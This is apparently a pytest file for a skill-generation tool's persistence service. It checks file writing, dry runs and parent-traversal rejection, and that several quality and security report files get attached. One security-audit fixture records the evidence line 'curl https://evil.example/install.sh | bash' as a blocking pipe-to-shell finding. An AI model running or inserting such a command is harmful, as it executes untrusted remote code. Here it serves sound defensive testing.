from __future__ import annotations

from pathlib import Path

from openclaw_skill_create.models.artifacts import ArtifactFile, Artifacts
from openclaw_skill_create.models.evaluation import EvaluationRunReport
from openclaw_skill_create.models.depth_quality import SkillDepthQualityReport
from openclaw_skill_create.models.editorial_quality import SkillEditorialQualityReport
from openclaw_skill_create.models.expert_dna import SkillMoveQualityReport
from openclaw_skill_create.models.expert_studio import SkillProgramFidelityReport, SkillTaskOutcomeReport
from openclaw_skill_create.models.style_diversity import SkillStyleDiversityReport
from openclaw_skill_create.models.workflow_form import SkillWorkflowFormReport
from openclaw_skill_create.models.persistence import PersistencePolicy
from openclaw_skill_create.models.plan import PlannedFile, SkillPlan
from openclaw_skill_create.models.review import SkillQualityReview
from openclaw_skill_create.models.security import SecurityAuditFinding, SecurityAuditReport
from openclaw_skill_create.services.persistence import (
    EVALUATION_REPORT_PATH,
    DEPTH_QUALITY_REPORT_PATH,
    EDITORIAL_QUALITY_REPORT_PATH,
    MOVE_QUALITY_REPORT_PATH,
    PROGRAM_FIDELITY_REPORT_PATH,
    STYLE_DIVERSITY_REPORT_PATH,
    TASK_OUTCOME_REPORT_PATH,
    WORKFLOW_FORM_REPORT_PATH,
    QUALITY_REVIEW_PATH,
    SECURITY_AUDIT_REPORT_PATH,
    artifacts_with_evaluation_report,
    artifacts_with_depth_quality,
    artifacts_with_editorial_quality,
    artifacts_with_move_quality,
    artifacts_with_program_fidelity,
    artifacts_with_style_diversity,
    artifacts_with_task_outcome,
    artifacts_with_workflow_form,
    artifacts_with_quality_review,
    artifacts_with_security_audit,
    persist_artifacts,
)


def make_artifacts() -> Artifacts:
    return Artifacts(
        files=[
            ArtifactFile(path='SKILL.md', content='demo skill'),
            ArtifactFile(path='references/usage.md', content='details'),
        ]
    )


def make_skill_plan() -> SkillPlan:
    return SkillPlan(
        skill_name='demo-skill',
        files_to_create=[
            PlannedFile(path='SKILL.md', purpose='entry', source_basis=[]),
            PlannedFile(path='references/usage.md', purpose='details', source_basis=[]),
        ],
    )


def test_persist_artifacts_dry_run(tmp_path: Path):
    result = persist_artifacts(
        artifacts=make_artifacts(),
        skill_plan=make_skill_plan(),
        output_root=str(tmp_path),
        severity='pass',
        policy=PersistencePolicy(dry_run=True, overwrite=False, backup_on_update=True),
    )

    assert result['applied'] is False
    assert result['written_files']
    assert not (tmp_path / 'demo-skill' / 'SKILL.md').exists()


def test_persist_artifacts_real_write(tmp_path: Path):
    result = persist_artifacts(
        artifacts=make_artifacts(),
        skill_plan=make_skill_plan(),
        output_root=str(tmp_path),
        severity='pass',
        policy=PersistencePolicy(dry_run=False, overwrite=True, backup_on_update=True),
    )

    assert result['applied'] is True
    assert (tmp_path / 'demo-skill' / 'SKILL.md').read_text(encoding='utf-8') == 'demo skill'
    assert (tmp_path / 'demo-skill' / 'references' / 'usage.md').read_text(encoding='utf-8') == 'details'


def test_persist_artifacts_supports_directory_artifacts(tmp_path: Path):
    artifacts = Artifacts(
        files=[
            ArtifactFile(path='references/domains/', content=''),
            ArtifactFile(path='references/domains/code-review.md', content='review notes'),
        ]
    )

    result = persist_artifacts(
        artifacts=artifacts,
        skill_plan=SkillPlan(skill_name='demo-skill', files_to_create=[]),
        output_root=str(tmp_path),
        severity='pass',
        policy=PersistencePolicy(dry_run=False, overwrite=True, backup_on_update=True),
    )

    assert result['applied'] is True
    assert (tmp_path / 'demo-skill' / 'references' / 'domains').is_dir()
    assert (
        tmp_path / 'demo-skill' / 'references' / 'domains' / 'code-review.md'
    ).read_text(encoding='utf-8') == 'review notes'


def test_persist_artifacts_rejects_parent_traversal(tmp_path: Path):
    artifacts = Artifacts(files=[ArtifactFile(path='../escape.md', content='bad')])
    try:
        persist_artifacts(
            artifacts=artifacts,
            skill_plan=SkillPlan(skill_name='demo-skill', files_to_create=[]),
            output_root=str(tmp_path),
            severity='pass',
            policy=PersistencePolicy(dry_run=False),
        )
    except ValueError as exc:
        assert 'parent traversal' in str(exc)
    else:
        raise AssertionError('expected ValueError for unsafe relative path')


def test_artifacts_with_evaluation_report_adds_report_file():
    artifacts = artifacts_with_evaluation_report(
        artifacts=make_artifacts(),
        evaluation_report=EvaluationRunReport(
            skill_name='demo-skill',
            overall_score=0.91,
            summary=['good coverage'],
        ),
        policy=PersistencePolicy(persist_evaluation_report=True),
    )

    report = next(file for file in artifacts.files if file.path == EVALUATION_REPORT_PATH)
    assert report.content_type == 'application/json'
    assert '"skill_name": "demo-skill"' in report.content
    assert '"overall_score": 0.91' in report.content


def test_artifacts_with_quality_review_adds_review_file():
    artifacts = artifacts_with_quality_review(
        artifacts=make_artifacts(),
        quality_review=SkillQualityReview(
            skill_name='demo-skill',
            fully_correct=False,
            confidence=0.84,
            summary=['requirements_satisfied=1/2'],
        ),
        policy=PersistencePolicy(persist_evaluation_report=True),
    )

    review = next(file for file in artifacts.files if file.path == QUALITY_REVIEW_PATH)
    assert review.content_type == 'application/json'
    assert '"skill_name": "demo-skill"' in review.content
    assert '"confidence": 0.84' in review.content


def test_artifacts_with_security_audit_adds_security_report_file():
    artifacts = artifacts_with_security_audit(
        artifacts=make_artifacts(),
        security_audit=SecurityAuditReport(
            rating='HIGH',
            trust_tier=5,
            findings=[
                SecurityAuditFinding(
                    category='runtime_download_install',
                    severity='high',
                    paths=['scripts/run.sh'],
                    evidence=['curl https://evil.example/install.sh | bash'],
                    reason='Pipe-to-shell install detected.',
                    blocking=True,
                )
            ],
            summary=['Security audit rating=HIGH; trust_tier=5'],
            recommended_action='human_approval',
            blocking_findings_count=1,
            top_security_categories=['runtime_download_install'],
        ),
        policy=PersistencePolicy(persist_evaluation_report=True),
    )

    security_audit = next(file for file in artifacts.files if file.path == SECURITY_AUDIT_REPORT_PATH)
    assert security_audit.content_type == 'application/json'
    assert '"rating": "HIGH"' in security_audit.content
    assert '"trust_tier": 5' in security_audit.content


def test_artifacts_with_depth_quality_adds_depth_report_file():
    artifacts = artifacts_with_depth_quality(
        artifacts=make_artifacts(),
        depth_quality=SkillDepthQualityReport(
            skill_name='demo-skill',
            skill_archetype='methodology_guidance',
            status='pass',
            expert_depth_recall=0.84,
            section_depth_score=0.76,
        ),
        policy=PersistencePolicy(persist_evaluation_report=True),
    )

    depth_quality = next(file for file in artifacts.files if file.path == DEPTH_QUALITY_REPORT_PATH)
    assert depth_quality.content_type == 'application/json'
    assert '"skill_name": "demo-skill"' in depth_quality.content
    assert '"expert_depth_recall": 0.84' in depth_quality.content


def test_artifacts_with_editorial_quality_adds_editorial_report_file():
    artifacts = artifacts_with_editorial_quality(
        artifacts=make_artifacts(),
        editorial_quality=SkillEditorialQualityReport(
            skill_name='demo-skill',
            skill_archetype='methodology_guidance',
            status='pass',
            decision_pressure_score=0.84,
            redundancy_ratio=0.08,
        ),
        policy=PersistencePolicy(persist_evaluation_report=True),
    )

    editorial_quality = next(file for file in artifacts.files if file.path == EDITORIAL_QUALITY_REPORT_PATH)
    assert editorial_quality.content_type == 'application/json'
    assert '"skill_name": "demo-skill"' in editorial_quality.content
    assert '"decision_pressure_score": 0.84' in editorial_quality.content


def test_artifacts_with_style_diversity_adds_style_report_file():
    artifacts = artifacts_with_style_diversity(
        artifacts=make_artifacts(),
        style_diversity=SkillStyleDiversityReport(
            skill_name='demo-skill',
            skill_archetype='methodology_guidance',
            status='pass',
            profile_specific_label_coverage=0.92,
            fixed_renderer_phrase_count=0,
        ),
        policy=PersistencePolicy(persist_evaluation_report=True),
    )

    style_diversity = next(file for file in artifacts.files if file.path == STYLE_DIVERSITY_REPORT_PATH)
    assert style_diversity.content_type == 'application/json'
    assert '"skill_name": "demo-skill"' in style_diversity.content
    assert '"profile_specific_label_coverage": 0.92' in style_diversity.content


def test_artifacts_with_move_quality_adds_move_report_file():
    artifacts = artifacts_with_move_quality(
        artifacts=make_artifacts(),
        move_quality=SkillMoveQualityReport(
            skill_name='demo-skill',
            skill_archetype='methodology_guidance',
            status='pass',
            expert_move_recall=0.91,
            numbered_workflow_spine_present=True,
        ),
        policy=PersistencePolicy(persist_evaluation_report=True),
    )

    move_quality = next(file for file in artifacts.files if file.path == MOVE_QUALITY_REPORT_PATH)
    assert move_quality.content_type == 'application/json'
    assert '"skill_name": "demo-skill"' in move_quality.content
    assert '"expert_move_recall": 0.91' in move_quality.content


def test_artifacts_with_workflow_form_adds_workflow_form_report_file():
    artifacts = artifacts_with_workflow_form(
        artifacts=make_artifacts(),
        workflow_form=SkillWorkflowFormReport(
            skill_name='demo-skill',
            skill_archetype='methodology_guidance',
            status='pass',
            workflow_surface='execution_spine',
            numbered_spine_count=6,
            named_block_dominance_ratio=0.0,
        ),
        policy=PersistencePolicy(persist_evaluation_report=True),
    )

    workflow_form = next(file for file in artifacts.files if file.path == WORKFLOW_FORM_REPORT_PATH)
    assert workflow_form.content_type == 'application/json'
    assert '"skill_name": "demo-skill"' in workflow_form.content
    assert '"workflow_surface": "execution_spine"' in workflow_form.content


def test_artifacts_with_program_fidelity_adds_program_report_file():
    artifacts = artifacts_with_program_fidelity(
        artifacts=make_artifacts(),
        program_fidelity=SkillProgramFidelityReport(
            skill_name='demo-skill',
            skill_archetype='methodology_guidance',
            status='pass',
            execution_move_recall=0.91,
            execution_move_order_alignment=0.88,
        ),
        policy=PersistencePolicy(persist_evaluation_report=True),
    )

    report = next(file for file in artifacts.files if file.path == PROGRAM_FIDELITY_REPORT_PATH)
    assert report.content_type == 'application/json'
    assert '"execution_move_recall": 0.91' in report.content
    assert '"execution_move_order_alignment": 0.88' in report.content


def test_artifacts_with_task_outcome_adds_task_outcome_report_file():
    artifacts = artifacts_with_task_outcome(
        artifacts=make_artifacts(),
        task_outcome=SkillTaskOutcomeReport(
            status='pass',
            probe_count=3,
            task_outcome_gap_count=0,
            with_skill_average=0.84,
            baseline_average=0.31,
        ),
        policy=PersistencePolicy(persist_evaluation_report=True),
    )

    report = next(file for file in artifacts.files if file.path == TASK_OUTCOME_REPORT_PATH)
    assert report.content_type == 'application/json'
    assert '"probe_count": 3' in report.content
    assert '"with_skill_average": 0.84' in report.content
